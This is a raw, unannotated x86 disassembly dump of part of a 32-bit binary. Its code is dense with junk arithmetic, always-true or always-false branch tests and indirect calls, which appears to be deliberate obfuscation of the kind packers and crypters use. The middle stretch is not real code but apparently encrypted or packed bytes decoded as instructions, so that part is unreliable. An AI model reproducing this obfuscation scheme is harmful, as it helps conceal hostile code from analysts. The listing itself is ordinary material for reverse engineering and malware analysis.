  41fa2b:	or     DWORD PTR ds:0x428353,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x4282ff
  41fa3b:	and    DWORD PTR ds:0x4281bf,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x4282ab,0x4281eb
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x4282f3,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x4282d7,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428367,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x4281f7
  41fa8d:	mov    DWORD PTR ds:0x4281ef,0x4079
  41fa97:	cmp    DWORD PTR ds:0x4282d7,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x4280e3
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e98
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x4281b3
  41fabc:	sbb    ecx,DWORD PTR ds:0x4282ab
  41fac2:	mov    DWORD PTR ds:0x4281b3,ecx
  41fac8:	xor    DWORD PTR ds:0x4282fb,edx
  41face:	movzx  ecx,WORD PTR ds:0x4282b3
  41fad5:	or     DWORD PTR ds:0x42834b,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x4283db
  41fae3:	add    DWORD PTR ds:0x4282ef,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x4281cb
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x4281fb,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x42835f
  41fb06:	mov    DWORD PTR ds:0x4283e3,edx
  41fb0c:	mov    DWORD PTR ds:0x4281bf,ebx
  41fb12:	mov    DWORD PTR ds:0x428367,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x4281fb,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e9c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x428403
  41fb48:	or     ecx,DWORD PTR ds:0x4282d3
  41fb4e:	mov    DWORD PTR ds:0x428403,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x4281cb
  41fb5a:	add    ecx,DWORD PTR ds:0x428403
  41fb60:	mov    DWORD PTR ds:0x4281cb,ecx
  41fb66:	sbb    DWORD PTR ds:0x4282eb,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x4282ff
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x4282af
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x4282b7,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x4281ef,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x4282e7,0x4282eb
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x4283fb,0x428363
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x4283cf,0x0
  41fbc2:	mov    DWORD PTR ds:0x4281fb,ebx
  41fbc8:	mov    DWORD PTR ds:0x428407,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x4282d7,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x4281d7,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x4283cf,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x42813f
  41fbfd:	call   DWORD PTR ds:0x428ea0
  41fc03:	and    ecx,DWORD PTR ds:0x4282c3
  41fc09:	adc    DWORD PTR ds:0x428353,ecx
  41fc0f:	sub    DWORD PTR ds:0x42835b,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x4283cb
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42828b
  41fc21:	mov    DWORD PTR ds:0x4283cb,ecx
  41fc27:	and    DWORD PTR ds:0x428373,0x55d2
  41fc31:	add    DWORD PTR ds:0x4281ef,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x4282df,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x4282ef
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x4281bb
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x4282d7,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42828f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x4282f3,ebx
  41fc7a:	mov    DWORD PTR ds:0x428307,0x2746
  41fc84:	mov    DWORD PTR ds:0x4282d7,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x4281cb,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42828f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428f14
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x428403
  41fcc1:	and    DWORD PTR ds:0x4281cb,0x42837f
  41fccb:	mov    ecx,DWORD PTR ds:0x4281d3
  41fcd1:	xor    DWORD PTR ds:0x42829f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x4282e7
  41fcde:	sub    DWORD PTR ds:0x4283f3,ecx
  41fce4:	mov    DWORD PTR ds:0x4282a3,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x428407
  41fd0b:	add    eax,DWORD PTR ds:0x4281cf
  41fd11:	mov    ds:0x428407,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428373,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x42835b
  41fd39:	mov    ecx,DWORD PTR ds:0x4283eb
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42828b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428373,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428ea4
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x4282d3,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x4282af,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x428313
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x4282ff,ecx
  41fd92:	sbb    DWORD PTR ds:0x4283f3,0x42837b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42836f,0x428373
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x4281df,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x4283cf
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x4283cf
  41fe15:	xor    DWORD PTR ds:0x4283d7,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x4281cf,0x0
  41fe51:	not    DWORD PTR ds:0x4282fb
  41fe57:	mov    DWORD PTR ds:0x428297,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x4281cf,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428ea8
  41fe7d:	and    DWORD PTR ds:0x4283e7,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42829f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428377
  41fe94:	and    DWORD PTR ds:0x428353,ecx
  41fe9a:	and    DWORD PTR ds:0x4282c7,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x42820b
  41feab:	mov    ecx,DWORD PTR ds:0x42843f
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x4281ef
  41fed3:	or     DWORD PTR ds:0x428403,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x4282cb,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x4283cf,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x42834b,ecx
  41ff06:	cmp    DWORD PTR ds:0x4282cb,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x4281b3
  41ff18:	call   DWORD PTR ds:0x428f18
  41ff1e:	or     ecx,DWORD PTR ds:0x4281d3
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428377,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42829b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x66
  41ff55:	int    0xf6
  41ff57:	push   0x23
  41ff59:	and    edx,DWORD PTR [esi]
  41ff5b:	sbb    BYTE PTR [ebx-0x79e7e7ee],ah
  41ff61:	push   cs
  41ff62:	xchg   ebp,eax
  41ff63:	sub    cl,ch
  41ff65:	jmp    0x41ff6c
  41ff67:	rcl    DWORD PTR [edi+0x1a],cl
  41ff6a:	dec    ecx
  41ff6b:	xchg   esi,eax
  41ff6c:	add    DWORD PTR [eax-0x67],esp
  41ff6f:	mov    gs,ecx
  41ff71:	stos   BYTE PTR es:[edi],al
  41ff72:	dec    esp
  41ff73:	cmp    dl,BYTE PTR [ebp+edx*4-0x3ddc9164]
  41ff7a:	js     0x41ff61
  41ff7c:	stos   BYTE PTR es:[edi],al
  41ff7d:	jmp    0x41ff0f
  41ff7f:	mov    ds:0x6339afab,eax
  41ff84:	push   ebp
  41ff85:	mov    ch,0x58
  41ff87:	addr16 in al,dx
  41ff89:	pop    edx
  41ff8a:	pop    ss
  41ff8b:	test   BYTE PTR [esp+esi*8-0x4f],dh
  41ff8f:	adc    eax,0x847c173b
  41ff94:	imul   ebp,DWORD PTR [esi-0x2d],0x3c
  41ff98:	fidivr WORD PTR [ebp-0x5a0ed718]
  41ff9e:	pop    ds
  41ff9f:	and    eax,0xf7a5324e
  41ffa4:	cmp    cl,BYTE PTR [ebx+0x3f8ed5fa]
  41ffaa:	pop    ebp
  41ffab:	test   al,0xe
  41ffad:	clc    
  41ffae:	(bad)  
  41ffaf:	pop    eax
  41ffb0:	fwait
  41ffb1:	dec    ecx
  41ffb2:	push   0x5
  41ffb4:	in     eax,0xc3
  41ffb6:	rcl    DWORD PTR [ebx],0x12
  41ffb9:	ins    DWORD PTR es:[edi],dx
  41ffba:	daa    
  41ffbb:	cdq    
  41ffbc:	mov    ebx,0x1df7efc9
  41ffc1:	dec    edx
  41ffc2:	lahf   
  41ffc3:	dec    ebx
  41ffc4:	jno    0x41ff7b
  41ffc6:	ins    DWORD PTR es:[edi],dx
  41ffc7:	je     0x41fff0
  41ffc9:	ja     0x420028
  41ffcb:	popf   
  41ffcc:	fsub   DWORD PTR [eax+0x46]
  41ffcf:	xor    ebp,eax
  41ffd1:	imul   edi,ebp,0x4b
  41ffd4:	cmp    dl,0xd7
  41ffd7:	pop    ds
  41ffd8:	mov    ebx,0x70df17cf
  41ffdd:	xor    dh,dl
  41ffdf:	dec    esp
  41ffe0:	push   esi
  41ffe1:	fcomp  DWORD PTR [edx]
  41ffe3:	pop    ebp
  41ffe4:	add    ebp,DWORD PTR [ebx+edx*2-0x48c0582a]
  41ffeb:	pusha  
  41ffec:	not    dl
  41ffee:	cmp    DWORD PTR [edx+eax*4+0x35],esp
  41fff2:	mul    DWORD PTR [edi+0x12cbdc50]
  41fff8:	and    al,0x24
  41fffa:	imul   edx,esp,0x7e2e7afa
  420000:	(bad)  
  420001:	cs inc edx
  420003:	xor    al,0xc2
  420005:	repnz retf 0xfee9
  420009:	test   eax,0x9d53be8b
  42000e:	mov    eax,ds:0x3964f202
  420013:	xchg   esi,eax
  420014:	push   ds
  420015:	adc    edx,ecx
  420017:	leave  
  420018:	adc    al,0x3d
  42001a:	enter  0xabb6,0x3c
  42001e:	ins    BYTE PTR es:[edi],dx
  42001f:	data16 lods al,BYTE PTR ds:[esi]
  420021:	lods   eax,DWORD PTR ds:[esi]
  420022:	fistp  DWORD PTR [ecx-0x4f]
  420025:	xchg   edi,eax
  420026:	outs   dx,BYTE PTR ds:[esi]
  420027:	aam    0x94
  420029:	push   esp
  42002a:	xchg   ebp,eax
  42002b:	test   al,0x5
  42002d:	push   es
  42002e:	inc    eax
  42002f:	pusha  
  420030:	jno    0x420011
  420032:	jns    0x4200b0
  420034:	xor    BYTE PTR [eax],dh
  420036:	push   ebx
  420037:	cmp    ah,ch
  420039:	sub    edx,DWORD PTR [ebp-0x69]
  42003c:	sub    eax,0xca4965ea
  420041:	pop    esp
  420042:	mov    al,ds:0xc10b09d
  420047:	retf   0xafa8
  42004a:	mov    edx,0xbb90679c
  42004f:	in     al,0x79
  420051:	data16 cmc 
  420053:	rol    DWORD PTR [eax],1
  420055:	and    ecx,DWORD PTR [ecx+edx*2+0x74d3b487]
  42005c:	(bad)  
  42005d:	jne    0x420059
  42005f:	cmp    esp,DWORD PTR ss:[edi]
  420062:	test   eax,0xa7315df9
  420067:	push   ebp
  420068:	int    0x11
  42006a:	mov    edx,0x77dd8a29
  42006f:	repnz out 0x23,al
  420072:	jb     0x4200e0
  420074:	dec    ebp
  420075:	add    ebx,ecx
  420077:	(bad)  
  420078:	inc    ecx
  420079:	jp     0x420046
  42007b:	or     al,BYTE PTR [edx]
  42007d:	pop    ebx
  42007e:	js     0x420011
  420080:	jo     0x42007d
  420082:	mov    bh,0x76
  420084:	repnz int 0x99
  420087:	aas    
  420088:	leave  
  420089:	dec    edx
  42008a:	jge    0x420102
  42008c:	mov    edx,0xaacada56
  420091:	ins    BYTE PTR es:[edi],dx
  420092:	js     0x4200f4
  420094:	mov    dh,BYTE PTR [edx-0x3c1a9064]
  42009a:	fistp  QWORD PTR [ebx-0x2cd53989]
  4200a0:	es xor eax,0xb74a44cb
  4200a6:	or     edx,DWORD PTR [ecx]
  4200a8:	mov    ecx,0x6077b97
  4200ad:	xor    ah,BYTE PTR [ebx+ecx*4-0x2f]
  4200b1:	xor    BYTE PTR [esi-0x5e],cl
  4200b4:	arpl   WORD PTR ds:[ecx-0x4],si
  4200b8:	imul   edx,DWORD PTR [ebx],0x3c6911a0
  4200be:	imul   ebp,DWORD PTR [edi+edi*1+0xb],0x38c62c7f
  4200c6:	xor    eax,0xcb3f045f
  4200cb:	adc    eax,0x1edd0f00
  4200d0:	cli    
  4200d1:	(bad)  
  4200d2:	jnp    0x4200bb
  4200d4:	jno    0x42010f
  4200d6:	aam    0xca
  4200d8:	jmp    0x420159
  4200da:	push   0xf1c9e0d2
  4200df:	(bad)  
  4200e0:	cmp    dl,BYTE PTR [esi+0x5]
  4200e3:	jg     0x4200cc
  4200e5:	dec    esp
  4200e6:	add    dh,BYTE PTR ds:0x9dfdd5fa
  4200ec:	and    eax,0xbfa49fdb
  4200f1:	mov    ah,0x3
  4200f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200f4:	xor    eax,0x4f66f6c1
  4200f9:	nop
  4200fa:	jp     0x420150
  4200fc:	adc    esp,esp
  4200fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200ff:	mov    al,ds:0xbfade0fe
  420104:	dec    ebp
  420105:	cli    
  420106:	mov    bl,0x6
  420108:	sar    BYTE PTR [edi+0x48],0x1b
  42010c:	push   edi
  42010d:	cld    
  42010e:	std    
  42010f:	daa    
  420110:	mov    al,ds:0xcd3096ff
  420115:	jl     0x420187
  420117:	shl    BYTE PTR [esi+0xc],0x3e
  42011b:	stos   DWORD PTR es:[edi],eax
  42011c:	xor    BYTE PTR [esi],ch
  42011e:	jnp    0x420177
  420120:	hlt    
  420121:	adc    eax,0xe0e16ae5
  420126:	mov    dh,0x89
  420128:	sbb    dl,cl
  42012a:	test   al,0xae
  42012c:	mov    edx,0x10eecfdf
  420131:	dec    ebx
  420132:	xchg   ebx,eax
  420133:	add    bh,BYTE PTR [eax+0x4c067b69]
  420139:	(bad)  
  42013a:	std    
  42013b:	leave  
  42013c:	mov    ah,0x9f
  42013e:	sbb    ebp,esi
  420140:	jnp    0x42011e
  420142:	das    
  420143:	push   ds
  420144:	lahf   
  420145:	popf   
  420146:	dec    eax
  420147:	xor    edi,ebx
  420149:	into   
  42014a:	mov    cl,0x8f
  42014c:	mov    WORD PTR [ecx],es
  42014e:	xor    edi,DWORD PTR [edi]
  420150:	pop    eax
  420151:	push   edx
  420152:	fwait
  420153:	shufps xmm3,XMMWORD PTR [eax],0x31
  420157:	jo     0x4201b0
  420159:	rol    BYTE PTR [ecx-0x1f4e4376],1
  42015f:	jge    0x420108
  420161:	mov    ecx,DWORD PTR [esi-0x4ed44da6]
  420167:	sub    al,0x37
  420169:	jge    0x4201a9
  42016b:	pop    edx
  42016c:	cwde   
  42016d:	add    DWORD PTR [esi+0x5a6e8653],eax
  420173:	or     BYTE PTR [ebx-0x2f],0x7c
  420177:	mov    bh,0x4f
  420179:	shl    BYTE PTR [edi],0xd9
  42017c:	jno    0x4201ac
  42017e:	call   0xf6c1:0x2d55fd35
  420185:	jge    0x4201b4
  420187:	add    eax,0xfa4e3b48
  42018c:	sbb    BYTE PTR [ecx],dh
  42018e:	adc    BYTE PTR [ebp-0x78],cl
  420191:	retf   
  420192:	inc    eax
  420193:	cmp    ebx,esi
  420195:	dec    edi
  420196:	adc    DWORD PTR [ecx],ebp
  420198:	mov    edx,DWORD PTR [edi]
  42019a:	aam    0x7d
  42019c:	add    dh,BYTE PTR [edi]
  42019e:	add    dl,bl
  4201a0:	popw   ds
  4201a2:	jmp    0x4201e9
  4201a4:	or     eax,DWORD PTR [esi-0x7d656c85]
  4201aa:	lock mov edx,0x2d170243
  4201b0:	and    al,0xaf
  4201b2:	pop    ecx
  4201b3:	inc    eax
  4201b4:	dec    esi
  4201b5:	(bad)  
  4201b6:	pop    ebx
  4201b7:	jg     0x420158
  4201b9:	jmp    0x420172
  4201bb:	call   0x47e5:0x3f4a3a95
  4201c2:	in     al,0xb
  4201c4:	sahf   
  4201c5:	cs iret 
  4201c7:	(bad)  
  4201c8:	cmp    eax,0x303608ab
  4201cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ce:	ss into 
  4201d0:	fsub   QWORD PTR [edi+0x2f]
  4201d3:	or     BYTE PTR [edx],bh
  4201d5:	add    BYTE PTR [eax],ch
  4201d7:	or     eax,0x9cda962e
  4201dc:	pop    ds
  4201dd:	rol    DWORD PTR ds:[edi],1
  4201e0:	mov    BYTE PTR [esi-0x2e41cdfe],dh
  4201e6:	push   edi
  4201e7:	pop    es
  4201e8:	xor    dl,0x68
  4201eb:	fs pop edi
  4201ed:	adc    bl,cl
  4201ef:	adc    eax,0x33cde4e8
  4201f4:	xchg   ebp,eax
  4201f5:	std    
  4201f6:	mov    ds:0xf6e7f086,eax
  4201fb:	pop    ecx
  4201fc:	sti    
  4201fd:	aaa    
  4201fe:	push   0xffffffaf
  420200:	fimul  DWORD PTR es:[eax+0x29]
  420204:	sahf   
  420205:	sub    esp,edi
  420207:	lods   al,BYTE PTR ds:[esi]
  420208:	mov    ah,bh
  42020a:	(bad)  
  42020b:	fndisi(8087 only) 
  42020d:	frstor [ecx-0x3e]
  420210:	inc    edx
  420211:	push   ds
  420212:	out    dx,eax
  420213:	imul   ebx,DWORD PTR [ebx+0x4a]
  420217:	xor    al,0x3b
  420219:	pop    ss
  42021a:	dec    esp
  42021b:	int    0xe7
  42021d:	jmp    0x961d:0x8953c699
  420224:	ret    
  420225:	pop    esi
  420226:	and    esp,DWORD PTR [ebp+0x7be60751]
  42022c:	cld    
  42022d:	movlps xmm0,QWORD PTR [ebx+edi*8]
  420231:	scas   eax,DWORD PTR es:[edi]
  420232:	test   DWORD PTR [eax+0x5],esp
  420235:	jae    0x42022e
  420237:	rcr    cl,1
  420239:	mov    ds:0xfcced925,al
  42023e:	aaa    
  42023f:	xchg   cl,dh
  420241:	ret    
  420242:	inc    edx
  420243:	xchg   DWORD PTR ds:0x5db8919a,ecx
  420249:	sti    
  42024a:	std    
  42024b:	iret   
  42024c:	mov    ecx,0x74e6d898
  420251:	jle    0x4201df
  420253:	out    0x92,eax
  420255:	lds    esi,FWORD PTR [ebp+ebp*8+0x6bfd6a60]
  42025c:	cmp    al,0xf6
  42025e:	sub    BYTE PTR [eax-0x58593295],dh
  420264:	je     0x42028e
  420266:	in     eax,dx
  420267:	sub    al,0x3a
  420269:	hlt    
  42026a:	xchg   esp,eax
  42026b:	faddp  st(0),st
  42026d:	cmp    cl,BYTE PTR [ebp+0x219b5de9]
  420273:	push   ss
  420274:	mov    dh,BYTE PTR [esi-0x2d]
  420277:	sub    ah,BYTE PTR [esi]
  420279:	add    bl,BYTE PTR [ebp-0x644ae114]
  42027f:	xlat   BYTE PTR ds:[ebx]
  420280:	cdq    
  420281:	or     DWORD PTR [ebx],eax
  420283:	js     0x420225
  420285:	sti    
  420286:	pop    esp
  420287:	out    dx,al
  420288:	push   ebx
  420289:	push   esi
  42028a:	mov    DWORD PTR [edi+0xc2861fe],esi
  420290:	sti    
  420291:	imul   eax,DWORD PTR [edi-0x58c77d1],0xb0935d15
  42029b:	loop   0x4202da
  42029d:	pop    eax
  42029e:	mov    ecx,DWORD PTR [di-0x114]
  4202a3:	(bad)  
  4202a4:	inc    DWORD PTR [ecx+0x4282ef0d]
  4202aa:	add    BYTE PTR [ebx-0x7d],ch
  4202ad:	inc    edx
  4202ae:	add    BYTE PTR [ebx],ch
  4202b0:	ror    DWORD PTR [ebx+0x4283e70d],0x0
  4202b7:	add    DWORD PTR ds:0x42836f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x4283eb,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x4281c7,0x4282e7
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x4283db,0x4281bf
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x4282d3,0x42828b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42836b,0x0
  42030c:	mov    DWORD PTR ds:0x4282c3,edx
  420312:	mov    esi,DWORD PTR ds:0x42828b
  420318:	mov    DWORD PTR ds:0x428367,ebx
  42031e:	mov    DWORD PTR ds:0x428377,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x4281e3,0x3019
  420337:	not    DWORD PTR ds:0x42836b
  42033d:	cmp    DWORD PTR ds:0x42836b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x4283cb
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428f1c
  420363:	adc    ecx,DWORD PTR ds:0x4282a3
  420369:	xor    DWORD PTR ds:0x42835f,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42827b
  420377:	mov    esi,DWORD PTR ds:0x428333
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x4281e7,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x42835b,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x4283d7,0x0
  4203b4:	mov    DWORD PTR ds:0x4282ff,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x4281fb
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x4282bf,0x2dc
  4203d5:	mov    DWORD PTR ds:0x4282bb,edi
  4203db:	cmp    DWORD PTR ds:0x4283d7,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x42804f
  4203ed:	call   DWORD PTR ds:0x428f20
  4203f3:	movzx  esi,WORD PTR ds:0x4281d7
  4203fa:	add    DWORD PTR ds:0x428357,esi
  420400:	adc    DWORD PTR ds:0x4281f7,ebx
  420406:	add    DWORD PTR ds:0x4283d3,0x22a2
  420410:	and    esi,DWORD PTR ds:0x4283d3
  420416:	or     DWORD PTR ds:0x4283cf,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x428353
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x4282d3,0x0
  42042e:	mov    DWORD PTR ds:0x4283d3,0x5615
  420438:	mov    DWORD PTR ds:0x4281cb,0x419b
  420442:	mov    DWORD PTR ds:0x4281ef,0x389d
  42044c:	not    DWORD PTR ds:0x4282c3
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x4282d3,0x0
  420463:	je     0x4204a0
  420469:	push   0x42829f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428f24
  420477:	sub    DWORD PTR ds:0x428357,0x6950
  420481:	movzx  esi,WORD PTR ds:0x4282cb
  420488:	xor    esi,DWORD PTR ds:0x42837b
  42048e:	mov    DWORD PTR ds:0x4282cb,esi
  420494:	mov    esi,DWORD PTR ds:0x4282b3
  42049a:	or     DWORD PTR ds:0x42834f,esi
  4204a0:	xor    DWORD PTR ds:0x42837f,ecx
  4204a6:	add    DWORD PTR ds:0x42837f,ebx
  4204ac:	or     DWORD PTR ds:0x4283d7,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x4281eb,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x4281cf,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x428407,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x4281eb,0x0
